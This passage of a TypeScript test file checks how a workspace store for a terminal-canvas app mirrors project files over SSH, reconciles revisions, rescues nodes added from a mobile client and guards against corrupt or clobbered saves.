      write: async (id: string, _s: any, c: string) => ((remote[id] = c), true)
    }
    const store = new WorkspaceStore(io)
    const p = project({ id: 'ps', ssh: sshConn, cwd: undefined })
    await remoteFileOf(store, p)                    // cache rev 1, mirrored to remote
    const newer = JSON.parse(remote['ps'])
    newer.rev = 5; newer.name = 'server-renamed'
    remote['ps'] = JSON.stringify(newer)
    const adopted = await store.refreshSshProject('ps')
    expect(adopted).toMatchObject({ id: 'ps', name: 'server-renamed' })
  })

  it('cache rev >= remote rev → pushes the cache up instead and returns null', async () => {
    const remote: Record<string, string> = {}
    const writes: string[] = []
    const io = {
      read: async (id: string) =>
        remote[id] != null ? { status: 'ok' as const, content: remote[id] } : { status: 'absent' as const },
      write: async (id: string, _s: any, c: string) => (writes.push(id), (remote[id] = c), true)
    }
    const store = new WorkspaceStore(io)
    await remoteFileOf(store, project({ id: 'ps', ssh: sshConn, cwd: undefined }))
    const older = JSON.parse(remote['ps'])
    older.rev = 0
    remote['ps'] = JSON.stringify(older)
    expect(await store.refreshSshProject('ps')).toBeNull()
    expect(writes.filter((w) => w === 'ps').length).toBeGreaterThanOrEqual(2) // seed + push-up
  })

  it('no remote file yet → pushes the cache up (first machine wins)', async () => {
    const remote: Record<string, string> = {}
    const io = {
      read: async () => ({ status: 'absent' as const }),
      write: async (id: string, _s: any, c: string) => ((remote[id] = c), true)
    }
    const store = new WorkspaceStore(io)
    await remoteFileOf(store, project({ id: 'ps', ssh: sshConn, cwd: undefined }))
    expect(await store.refreshSshProject('ps')).toBeNull()
    expect(remote['ps']).toContain('"id": "ps"')
  })
})

describe('ssh mirror guarantee (unmirrored retry)', () => {
  const sshConn = { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }

  /** Fake IO simulating a ControlMaster that is down until `up` flips: reads ERROR while down
   *  (a dead connection is not "no file"), writes fail while down. */
  const flakyIO = () => {
    const state = { up: false, writes: 0, remote: {} as Record<string, string> }
    const io = {
      read: async (id: string) => {
        if (!state.up) return { status: 'error' as const }
        return state.remote[id] != null
          ? { status: 'ok' as const, content: state.remote[id] }
          : { status: 'absent' as const }
      },
      write: async (id: string, _s: any, c: string) => {
        state.writes++
        if (!state.up) return false
        state.remote[id] = c
        return true
      }
    }
    return { state, io }
  }

  it('lands the mirror on a later save even when the first save ran disconnected', async () => {
    const { state, io } = flakyIO()
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])

    await store.save(w) // connection not up yet → read errors, nothing written, mirror owed
    expect(state.remote['ps']).toBeUndefined()

    state.up = true
    await store.save(w) // content unchanged, but the mirror is still owed
    expect(state.remote['ps']).toContain('"id": "ps"')
    expect(JSON.parse(state.remote['ps']).rev).toBe(1) // retry does not bump rev

    const writesSoFar = state.writes
    await store.save(w) // confirmed → unchanged saves stop writing
    expect(state.writes).toBe(writesSoFar)
  })

  it('markUnmirrored re-owes the mirror (a dropped trailing throttle write reports back)', async () => {
    const { state, io } = flakyIO()
    state.up = true
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])
    await store.save(w) // reconciles (absent) + pushes
    expect(state.remote['ps']).toContain('"id": "ps"')
    delete state.remote['ps'] // the acked-but-dropped trailing write: server never got it
    store.markUnmirrored('ps')
    await store.save(w) // unchanged content, but the debt is back
    expect(state.remote['ps']).toContain('"id": "ps"')
  })

  it('refreshSshProject records a failed push-up so the next save retries', async () => {
    const { state, io } = flakyIO()
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])
    await store.save(w) // dropped (down)

    expect(await store.refreshSshProject('ps')).toBeNull() // still down: read null, push-up fails
    state.up = true
    await store.save(w) // unchanged content, retried because refresh confirmed it is owed
    expect(state.remote['ps']).toContain('"id": "ps"')
  })

  it('a successful refresh push-up clears the debt (no redundant write on next save)', async () => {
    const { state, io } = flakyIO()
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])
    await store.save(w) // dropped
    state.up = true
    expect(await store.refreshSshProject('ps')).toBeNull() // push-up succeeds
    expect(state.remote['ps']).toContain('"id": "ps"')
    const writesAfterRefresh = state.writes
    await store.save(w) // unchanged + already mirrored → no write
    expect(state.writes).toBe(writesAfterRefresh)
  })
})

// THE reset bug (field report: 12 fresh project ids for one server folder in two weeks, 45 orphaned
// tmux sessions). Re-adding a folder via the SSH dialog minted a fresh project id with an empty
// canvas; its first mirror write clobbered the server's populated .nodeterm/project.json, and rev
// inflation (refresh seeded our counter from the remote lineage) made the empty canvas win every
// later reconcile. These tests pin the lineage rules that prevent it.
describe('ssh lineage safety', () => {
  const sshConn = { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }

  /** A populated remote project file from ANOTHER lineage (different project id). */
  const foreignRemote = (rev: number, nodes = 1) =>
    JSON.stringify({
      version: 1, rev, savedAt: 'then', id: 'old1', name: 'original', color: '#ffd60a',
      viewport: { x: 0, y: 0, zoom: 1 },
      nodes: Array.from({ length: nodes }, (_, i) => ({
        id: `term-old-${i + 1}`, kind: 'terminal', position: { x: 0, y: 0 },
        size: { width: 1, height: 1 }, title: 'survivor', color: '#fff', group: null
      }))
    })

  /** Fake IO keyed by remoteCwd — the server file is the same file no matter which local
   *  project id points at it (that is what makes re-adding dangerous). */
  const cwdIO = () => {
    const files: Record<string, string> = {}
    const io = {
      read: async (_id: string, ssh: any) =>
        files[ssh.remoteCwd] != null
          ? { status: 'ok' as const, content: files[ssh.remoteCwd] }
          : { status: 'absent' as const },
      write: async (_id: string, ssh: any, c: string) => ((files[ssh.remoteCwd] = c), true)
    }
    return { files, io }
  }

  it('a fresh empty project on a populated remote ADOPTS the remote (re-keyed to our id) instead of clobbering it', async () => {
    const { files, io } = cwdIO()
    files['~/app'] = foreignRemote(900)
    const store = new WorkspaceStore(io)
    // The dialog's re-add: fresh id, empty canvas.
    await store.save(ws([project({ id: 'fresh1', ssh: sshConn, cwd: undefined, nodes: [] })]))

    // The server file survived (never overwritten with the empty canvas).
    expect(JSON.parse(files['~/app']).nodes).toHaveLength(1)
    // The adoption is broadcast to the renderer under OUR project id (the renderer knows no 'old1').
    const msg = fake.sent.find((m) => m.channel === 'workspace:external-change')
    expect(msg).toBeTruthy()
    expect(msg!.args[0]).toMatchObject({ id: 'fresh1', name: 'original' })
    expect((msg!.args[0] as Project).nodes[0].id).toBe('term-old-1')

    // Rev continues the surviving lineage: the next real edit mirrors as rev 901, not rev 2.
    const adopted = msg!.args[0] as Project
    await store.save(ws([{ ...adopted, name: 'renamed' }]))
    expect(JSON.parse(files['~/app'])).toMatchObject({ rev: 901, id: 'fresh1', name: 'renamed' })
  })

  it('an existing remote file re-arms consent seeded by the new-project default', async () => {
    const { files, io } = cwdIO()
    const remote = JSON.parse(foreignRemote(12))
    remote.agentMessaging = true
    files['~/app'] = JSON.stringify(remote)
    const store = new WorkspaceStore(io)

    await store.save(ws([project({
      id: 'fresh1', ssh: sshConn, cwd: undefined, nodes: [], agentMessaging: true,
      capabilityAck: { agentMessaging: 'kept' },
      capabilityAckSource: { agentMessaging: 'local-default' }
    })]))

    const msg = fake.sent.find((m) => m.channel === 'workspace:external-change')
    expect(msg?.args[0]).toMatchObject({ id: 'fresh1', agentMessaging: true })
    expect((msg?.args[0] as Project).capabilityAck?.agentMessaging).toBeUndefined()
    expect((msg?.args[0] as Project).capabilityAckSource).toBeUndefined()
  })

  it('an EMPTY foreign remote never beats a populated cache, even with a higher rev — and the push outbids it', async () => {
    const { files, io } = cwdIO()
    files['~/app'] = foreignRemote(900, 0) // the clobbered file a buggy client left behind
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'fresh1', ssh: sshConn, cwd: undefined })])) // 1 real node

    const after = JSON.parse(files['~/app'])
    expect(after.id).toBe('fresh1')
    expect(after.nodes).toHaveLength(1) // our populated canvas pushed up
    expect(after.rev).toBeGreaterThan(900) // and it WINS future rev reconciles
    expect(fake.sent.find((m) => m.channel === 'workspace:external-change')).toBeUndefined()
  })

  it('a read ERROR blocks the first mirror write entirely (no clobber on a flaky connect), then heals', async () => {
    const files: Record<string, string> = {}
    let up = false
    const io = {
      read: async (_id: string, ssh: any) => {
        if (!up) return { status: 'error' as const }
        return files[ssh.remoteCwd] != null
          ? { status: 'ok' as const, content: files[ssh.remoteCwd] }
          : { status: 'absent' as const }
      },
      write: async (_id: string, ssh: any, c: string) => {
        if (!up) return false
        files[ssh.remoteCwd] = c
        return true
      }
    }
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'fresh1', ssh: sshConn, cwd: undefined })])
    await store.save(w)
    expect(files['~/app']).toBeUndefined() // error ≠ absent: nothing pushed blind
    up = true
    await store.save(w) // unchanged content — but the reconcile is still owed
    expect(files['~/app']).toContain('"id": "fresh1"')
  })

  // The mobile companion appends its new sessions to the server's project.json while the desktop
  // is running. The desktop polls the file (refreshSshProject with pushIfStanding:false) so those
  // nodes land on the live canvas — the poll must be read-only when our cache stands, or every
  // tick would spam a mirror write.
  it('poll: adopts a same-lineage remote that grew a node, and never writes when nothing is owed', async () => {
    const { files, io } = cwdIO()
    const writes: string[] = []
    const origWrite = io.write.bind(io)
    io.write = async (id: string, ssh: any, c: string) => (writes.push(id), origWrite(id, ssh, c))
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])) // reconcile + push rev 1
    const writesAfterSave = writes.length

    // The phone appends a node and bumps rev (same project id = same lineage).
    const f = JSON.parse(files['~/app'])
    f.rev = 2
    f.nodes = [...f.nodes, { id: 'term-mobile-1', kind: 'terminal', position: { x: 0, y: 700 }, size: { width: 1, height: 1 }, title: 'Mobile', color: '#fff', group: null }]
    files['~/app'] = JSON.stringify(f)

    const adopted = await store.refreshSshProject('ps', { pushIfStanding: false })
    expect(adopted?.nodes.map((n) => n.id)).toContain('term-mobile-1')
    expect(writes.length).toBe(writesAfterSave) // read-only poll

    // Unchanged remote → the next poll decides nothing and writes nothing.
    expect(await store.refreshSshProject('ps', { pushIfStanding: false })).toBeNull()
    expect(writes.length).toBe(writesAfterSave)
  })

  it('poll: still retries a mirror write that is owed (pushIfStanding:false does not cancel debts)', async () => {
    const files: Record<string, string> = {}
    let up = false
    const io = {
      read: async (_id: string, ssh: any) => {
        if (!up) return { status: 'error' as const }
        return files[ssh.remoteCwd] != null
          ? { status: 'ok' as const, content: files[ssh.remoteCwd] }
          : { status: 'absent' as const }
      },
      write: async (_id: string, ssh: any, c: string) => (up ? ((files[ssh.remoteCwd] = c), true) : false)
    }
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])) // down: owed
    up = true
    expect(await store.refreshSshProject('ps', { pushIfStanding: false })).toBeNull()
    expect(files['~/app']).toContain('"id": "ps"') // the owed mirror landed on the poll
  })

  it('sshProjectIds lists the ssh entries (the poll iterates these)', async () => {
    const { io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined }), project({ id: 'p2', name: 'inline' })]))
    expect(store.sshProjectIds()).toEqual(['ps'])
  })

  it('same-lineage reconcile is untouched: an emptier remote with a higher rev still wins (user cleared their canvas)', async () => {
    const { files, io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])) // rev 1, mirrored
    const cleared = JSON.parse(files['~/app'])
    cleared.rev = 7
    cleared.nodes = [] // the same project id, deliberately emptied on another machine
    files['~/app'] = JSON.stringify(cleared)
    const adopted = await store.refreshSshProject('ps')
    expect(adopted).toMatchObject({ id: 'ps' })
    expect(adopted!.nodes).toHaveLength(0)
  })

  // The FIELD BUG: a phone-created session (in an SSH project's folder on a server) never reached
  // the desktop canvas. The phone appends its node to the server's project.json and bumps rev vs the
  // file it read — but the desktop's CACHE rev can drift AHEAD of the server (a dropped/forgotten
  // final mirror write, or an offline edit), so a rev-only decision discards the phone's node and the
  // standing cache clobbers the server. Same-lineage must UNION remote-only session nodes, not lose
  // them. Guarded to both-sides-populated so the "user cleared their canvas" case above still wins.
  const node = (id: string, title: string) => ({
    id, kind: 'terminal' as const, position: { x: 0, y: 0 }, size: { width: 1, height: 1 },
    title, color: '#fff', group: null
  })
  it('rescues a mobile-appended node when our cache rev has drifted ahead of the server', async () => {
    const { files, io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 't')] })])) // rev 1
    // Two local edits drift our cache to rev 3 (the last mirror write is imagined dropped below).
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 'edit1')] })])) // rev 2
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 'edit2')] })])) // rev 3
    // The server is BEHIND our cache (rev 2, dropped final mirror) and the phone appended a session to it.
    files['~/app'] = JSON.stringify({
      version: 1, rev: 2, savedAt: 'then', id: 'ps', name: 'foo', color: '#7aa2f7',
      viewport: { x: 0, y: 0, zoom: 1 },
      nodes: [node('term-1', 'edit2'), node('term-mobile-1', 'Mobile')]
    })
    const adopted = await store.refreshSshProject('ps')
    // The phone's session reaches the live canvas...
    expect(adopted?.nodes.map((n) => n.id)).toContain('term-mobile-1')
    expect(adopted?.nodes.map((n) => n.id)).toContain('term-1') // and our own node survives too
    // ...and the merged set is pushed back so the server keeps it.
    expect(JSON.parse(files['~/app']).nodes.map((n: any) => n.id)).toContain('term-mobile-1')
  })

  // The write side of the same field failure, and the one the 15 s poll could NOT cover: the phone
  // appends its session at T0, the user drags a node here at T0+2 s, and that ordinary save's mirror
  // write used to serialize a cache that had never seen the append — deleting the phone's session
  // from BOTH sides, permanently, with nothing on screen to say it happened.
  it('mirror write: an ordinary local edit never deletes a node the phone appended since our last look', async () => {
    const { files, io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 't')] })]))
    // The phone appends straight into the server file (its own SSH path) and bumps rev.
    const f = JSON.parse(files['~/app'])
    f.rev = 2
    f.nodes = [...f.nodes, node('term-mobile-1', 'Mobile')]
    files['~/app'] = JSON.stringify(f)
    fake.sent.length = 0

    // …two seconds later, well inside the poll window, the user drags a node here.
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 'dragged')] })]))

    const after = JSON.parse(files['~/app'])
    expect(after.nodes.map((n: any) => n.id)).toContain('term-mobile-1') // survived the mirror write
    expect(after.nodes.find((n: any) => n.id === 'term-1').title).toBe('dragged') // our edit still landed
    // The rescued node is live on the server and missing from the canvas — the renderer is told now.
    const msg = fake.sent.find((m) => m.channel === 'workspace:external-change')
    expect(msg).toBeTruthy()
    expect((msg!.args[0] as Project).nodes.map((n) => n.id)).toContain('term-mobile-1')
  })

  // The other half of that rule: the re-read must not hand back what the user just deleted, or no
  // node on an ssh project could ever be closed (every mirror write would resurrect it).
  it('mirror write: a deliberate delete still propagates — the re-read does not resurrect it', async () => {
    const { files, io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 't')] })]))
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [] })])) // the user closed it
    expect(JSON.parse(files['~/app']).nodes).toEqual([])
    // …and the poll must not bring it back either.
    expect(await store.refreshSshProject('ps')).toBeNull()
    expect(JSON.parse(files['~/app']).nodes).toEqual([])
  })

  // An EMPTY desktop canvas is exactly where a phone-started session is the only node in the file,
  // so "empty side with the higher rev = a deliberate clear" was the most expensive place to guess
  // wrong: the rescue was skipped and the empty cache pushed up, erasing the phone's session.
  it('an empty canvas whose rev drifted ahead still rescues the node it never had', async () => {
    const { files, io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [] })])) // rev 1, empty
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [], name: 'renamed' })])) // rev 2
    // The server is BEHIND our cache (a dropped mirror write) and holds the phone's session.
    files['~/app'] = JSON.stringify({
      version: 1, rev: 1, savedAt: 'then', id: 'ps', name: 'foo', color: '#7aa2f7',
      viewport: { x: 0, y: 0, zoom: 1 }, nodes: [node('term-mobile-1', 'Mobile')]
    })
    const adopted = await store.refreshSshProject('ps')
    expect(adopted?.nodes.map((n) => n.id)).toContain('term-mobile-1') // reaches the live canvas
    expect(JSON.parse(files['~/app']).nodes.map((n: any) => n.id)).toContain('term-mobile-1') // and stays on the server
  })

  it('poll (read-only stand) still rescues + surfaces a drifted mobile append', async () => {
    const { files, io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 't')] })])) // rev 1
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 'edit')] })])) // rev 2
    files['~/app'] = JSON.stringify({
      version: 1, rev: 1, savedAt: 'then', id: 'ps', name: 'foo', color: '#7aa2f7',
      viewport: { x: 0, y: 0, zoom: 1 },
      nodes: [node('term-1', 'edit'), node('term-mobile-1', 'Mobile')]
    })
    const adopted = await store.refreshSshProject('ps', { pushIfStanding: false })
    expect(adopted?.nodes.map((n) => n.id)).toContain('term-mobile-1')
  })
})

// Field bug (enes, 2026-09-01): on an SSH project with heavy canvas-control churn (rev 19468 on the
// live file), the "Reload from disk / Keep mine" conflict bar kept appearing with nobody else
// editing. The reconciler recognized its own mirror writes only by REV — it had no analogue of the
// local watcher's `isSelfWrite` byte comparison — and `refreshSshProject` (the 15 s poll + the
// connect-time refresh) ran OFF the save chain, so a poll holding a pre-save entry snapshot could
// read the server file AFTER the save's mirror write landed: remote.rev > (stale) cacheRev, the
// store's own bytes were "adopted" and broadcast as an external change, and a dirty canvas raised
// the conflict bar over a file nobody else touched.
describe('ssh reconcile self-write recognition (the spurious conflict bar)', () => {
  const sshConn = { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }
  const node = (id: string, title: string) => ({
    id, kind: 'terminal' as const, position: { x: 0, y: 0 }, size: { width: 1, height: 1 },
    title, color: '#fff', group: null
  })

  it('a poll interleaved with a save never adopts that save\'s own mirror write', async () => {
    const remote: Record<string, string> = {}
    const gate: { open: (() => void) | null } = { open: null }
    let holdNextRead = false
    const io = {
      read: async (_id: string, ssh: any) => {
        if (holdNextRead) {
          // The poll's ssh `cat` in flight on a slow WAN link.
          holdNextRead = false
          await new Promise<void>((resolve) => { gate.open = resolve })
        }
        return remote[ssh.remoteCwd] != null
          ? { status: 'ok' as const, content: remote[ssh.remoteCwd] }
          : { status: 'absent' as const }
      },
      write: async (_id: string, ssh: any, c: string) => ((remote[ssh.remoteCwd] = c), true)
    }
    const store = new WorkspaceStore(io)
    const p1 = project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 't')] })
    await store.save(ws([p1])) // seed: cache rev 1, mirrored

    // The 15 s poll fires; its read hangs mid-flight…
    holdNextRead = true
    const poll = store.refreshSshProject('ps', { pushIfStanding: false })
    await vi.waitFor(() => { if (!gate.open && holdNextRead) throw new Error('poll read not reached') })
    // …while an ordinary autosave (canvas-control created a node) lands and mirrors rev 2.
    const p2 = { ...p1, nodes: [...p1.nodes, node('term-2', 'spawned')] }
    const save2 = store.save(ws([p2]))
    // Give an un-serialized save time to run to completion (under the fix it queues instead).
    await new Promise((resolve) => setTimeout(resolve, 25))
    gate.open?.()
    await save2
    // The poll saw either the pre-save file (rev 1 == its snapshot) or the save's own write —
    // neither is an external change, so nothing may be adopted / broadcast toward the conflict bar.
    await expect(poll).resolves.toBeNull()
    expect(JSON.parse(remote['~/app']).rev).toBe(2) // the save's mirror still landed
  })

  it('an older own mirror write read back inside the throttle window does not resurrect a deleted node', async () => {
    // Simulates the real remote IO's 5 s trailing throttle: the write is acked optimistically
    // while the server still holds the PREVIOUS bytes.
    const remote: Record<string, string> = {}
    let throttleHold = false
    const io = {
      read: async (_id: string, ssh: any) =>
        remote[ssh.remoteCwd] != null
          ? { status: 'ok' as const, content: remote[ssh.remoteCwd] }
          : { status: 'absent' as const },
      write: async (_id: string, ssh: any, c: string) => {
        if (!throttleHold) remote[ssh.remoteCwd] = c
        return true // optimistic ack either way — the trailing write "will" land
      }
    }
    const store = new WorkspaceStore(io)
    const both = [node('term-1', 't'), node('term-x', 'closed later')]
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: both })])) // rev 1 on the server
    throttleHold = true // next mirror write is acked but not yet on the wire
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 't')] })])) // user closed term-x
    // The poll reads the server before the trailing write fires: it sees OUR OWN rev-1 bytes,
    // which still contain term-x. That is a self-write echo, not a foreign append — rescuing
    // term-x here would resurrect the node the user just deliberately closed.
    await expect(store.refreshSshProject('ps', { pushIfStanding: false })).resolves.toBeNull()
  })

  it('a genuinely external edit is still adopted — self-write recognition matches exact bytes only', async () => {
    const remote: Record<string, string> = {}
    const io = {
      read: async (_id: string, ssh: any) =>
        remote[ssh.remoteCwd] != null
          ? { status: 'ok' as const, content: remote[ssh.remoteCwd] }
          : { status: 'absent' as const },
      write: async (_id: string, ssh: any, c: string) => ((remote[ssh.remoteCwd] = c), true)
    }
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 't')] })]))
    // Another machine edits the file we last mirrored: content derived from ours, but not ours.
    const f = JSON.parse(remote['~/app'])
    f.rev = 5
    f.name = 'renamed-elsewhere'
    remote['~/app'] = JSON.stringify(f)
    const adopted = await store.refreshSshProject('ps', { pushIfStanding: false })
    expect(adopted).toMatchObject({ id: 'ps', name: 'renamed-elsewhere' })
  })
})

// Field bug (2026-08-10): two projects + rapid tab switching → both canvases wiped. Every switch
// fires an un-awaited full save; save() was unserialized and writeAtomic used one fixed tmp path,
// so overlapping saves spliced each other's tmp bytes (corrupt JSON published by rename) and a slow
// older save could land its stale index after a newer one. A corrupt index then silently became
// EMPTY_WORKSPACE, which the renderer's unconditional boot save wrote back — zero entries, no backup.
describe('save corruption hardening', () => {
  afterEach(() => {
    vi.restoreAllMocks()
  })

  it('overlapping saves land in call order — a slow earlier save cannot regress the index', async () => {
    const store = new WorkspaceStore()
    // Stall the FIRST project-file write so the first save is still in flight when the second lands.
    let release!: () => void
    const gate = new Promise<void>((r) => { release = r })
    const realWrite = fs.writeFile.bind(fs)
    let stalled = false
    vi.spyOn(fs, 'writeFile').mockImplementation(async (p, data, enc) => {
      if (!stalled && String(p).includes('project.json')) {
        stalled = true
        await gate
      }
      return realWrite(p as string, data as string, enc as BufferEncoding)
    })
    const first = store.save(ws([project({ cwd: projRoot })]))
    const second = store.save(ws([project({ cwd: projRoot, name: 'renamed' })]))
    await new Promise((r) => setTimeout(r, 100)) // unserialized, the second save finishes here
    release()
    await Promise.all([first, second])
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].name).toBe('renamed')
  })

  it('no two atomic writes ever share a tmp path (concurrent writers cannot splice)', async () => {
    const tmpPaths: string[] = []
    const realWrite = fs.writeFile.bind(fs)
    vi.spyOn(fs, 'writeFile').mockImplementation(async (p, data, enc) => {
      if (String(p).includes('.tmp')) tmpPaths.push(String(p))
      return realWrite(p as string, data as string, enc as BufferEncoding)
    })
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    await store.save(ws([project({ cwd: projRoot, name: 'renamed' })]))
    expect(tmpPaths.length).toBeGreaterThanOrEqual(2) // both saves really wrote
    expect(new Set(tmpPaths).size).toBe(tmpPaths.length)
  })

  it('an empty canvas never blind-overwrites a populated project.json it has not read', async () => {
    await new WorkspaceStore().save(ws([project({ cwd: projRoot })])) // populated file on disk
    // A different store (fresh boot, setProjectFolder, migration…) that never read that file:
    const fresh = new WorkspaceStore()
    await fresh.save(ws([project({ cwd: projRoot, nodes: [] })]))
    const file = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    expect(file.nodes.map((n: any) => n.id)).toEqual(['term-1'])
    // The rest of the save still happened — only the destructive file write was skipped.
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].cwd).toBe(projRoot)
  })

  it('a legitimately cleared canvas still persists for a store that has read the file', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    await store.save(ws([project({ cwd: projRoot, nodes: [] })])) // user deleted every node
    const file = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    expect(file.nodes).toEqual([])
  })

  it('an unparsable workspace.json is sidelined to .corrupt-<ts> on load, not silently emptied', async () => {
    await fs.writeFile(path.join(userData, 'workspace.json'), '{"version":3,"entries":[{"id"')
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects).toEqual([])
    const names = await fs.readdir(userData)
    const sidelined = names.find((n) => /^workspace\.json\.corrupt-\d+$/.test(n))
    expect(sidelined).toBeDefined()
    expect(await fs.readFile(path.join(userData, sidelined!), 'utf-8')).toBe('{"version":3,"entries":[{"id"')
    expect(names).not.toContain('workspace.json')
  })

  it('a read-only load (sideline: false) leaves an unparsable workspace.json in place', async () => {
    await fs.writeFile(path.join(userData, 'workspace.json'), 'not json')
    await new WorkspaceStore().load({ sideline: false })
    expect(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')).toBe('not json')
  })

  // Sidelining alone left the user in an empty workspace with no explanation ("my projects are
  // gone") even though every .nodeterm/project.json is intact. The load path says so, once.
  it('a sidelined index broadcasts the recovery note once, with the backup filename', async () => {
    await fs.writeFile(path.join(userData, 'workspace.json'), 'not json')
    const store = new WorkspaceStore()
    await store.load()
    const notes = fake.sent.filter((m) => m.channel === 'workspace:corrupt-recovered')
    expect(notes).toHaveLength(1)
    expect(notes[0].args[0]).toMatch(/^workspace\.json\.corrupt-\d+$/)
    expect(await fs.readdir(userData)).toContain(notes[0].args[0])
    // Second load of the same run (the sidelined copy is still there, index gone) stays quiet.
    await store.load()
    expect(fake.sent.filter((m) => m.channel === 'workspace:corrupt-recovered')).toHaveLength(1)
  })

  it('a read-only load (sideline: false) never broadcasts the recovery note', async () => {
    await fs.writeFile(path.join(userData, 'workspace.json'), 'not json')
    await new WorkspaceStore().load({ sideline: false })
    expect(fake.sent.some((m) => m.channel === 'workspace:corrupt-recovered')).toBe(false)
  })

  // Crash between the sideline rename and the next index write: workspace.json is simply MISSING
  // next to the backup, which is indistinguishable from a first run unless we look.
  it('a missing index next to an existing .corrupt- backup still broadcasts (newest backup)', async () => {
    await fs.writeFile(path.join(userData, 'workspace.json.corrupt-100'), 'old')
    await fs.writeFile(path.join(userData, 'workspace.json.corrupt-900'), 'newer')
    await new WorkspaceStore().load()
    const notes = fake.sent.filter((m) => m.channel === 'workspace:corrupt-recovered')
    expect(notes).toHaveLength(1)
    expect(notes[0].args[0]).toBe('workspace.json.corrupt-900')
  })

  it('a normal load (and a first run) broadcasts nothing', async () => {
    await new WorkspaceStore().save(ws([project({ cwd: projRoot })]))
    await new WorkspaceStore().load() // healthy index
    expect(fake.sent.some((m) => m.channel === 'workspace:corrupt-recovered')).toBe(false)
    await fs.rm(path.join(userData, 'workspace.json'))
    await new WorkspaceStore().load() // first run: nothing on disk at all
    expect(fake.sent.some((m) => m.channel === 'workspace:corrupt-recovered')).toBe(false)
  })

  it('a fresh store may not replace a populated index with an empty workspace', async () => {
    await new WorkspaceStore().save(ws([project({ cwd: projRoot })]))
    const before = await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')
    // Boot-order accident: save(empty) from a store that never managed to load the index
    // (transient read failure, or a hydrate that raced the load).
    await new WorkspaceStore().save(ws([]))
    expect(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')).toBe(before)
  })

  it('a failed atomic write removes its own temp file (index write)', async () => {
    // Force the rename to fail: the target is a directory. The unique temp name never self-heals
    // the way the old fixed one did, so the failed write must clean up after itself.
    await fs.mkdir(path.join(userData, 'workspace.json'))
    await expect(new WorkspaceStore().save(ws([project({ cwd: projRoot })]))).rejects.toThrow()
    const litter = (await fs.readdir(userData)).filter((n) => n.endsWith('.tmp'))
    expect(litter).toEqual([])
  })

  it('a swallowed project-file write failure still leaves no temp litter in .nodeterm', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const file = path.join(projRoot, '.nodeterm', 'project.json')
    await fs.rm(file)
    await fs.mkdir(file) // rename now fails; save() swallows per-file errors by design
    await store.save(ws([project({ cwd: projRoot, name: 'renamed' })]))
    const litter = (await fs.readdir(path.join(projRoot, '.nodeterm'))).filter((n) => n.endsWith('.tmp'))
    expect(litter).toEqual([])
  })

  it('load() sweeps stale tmp litter from dead writers, sparing this process and other files', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const nodeterm = path.join(projRoot, '.nodeterm')
    await fs.writeFile(path.join(userData, 'workspace.json.tmp'), 'x') // legacy fixed name
    await fs.writeFile(path.join(userData, 'workspace.json.99999.1.tmp'), 'x') // dead pid
    await fs.writeFile(path.join(nodeterm, 'project.json.99999.2.tmp'), 'x') // dead pid
    const mine = `project.json.${process.pid}.7.tmp` // a live writer of THIS process — never swept
    await fs.writeFile(path.join(nodeterm, mine), 'x')
    const loaded = await new WorkspaceStore().load()
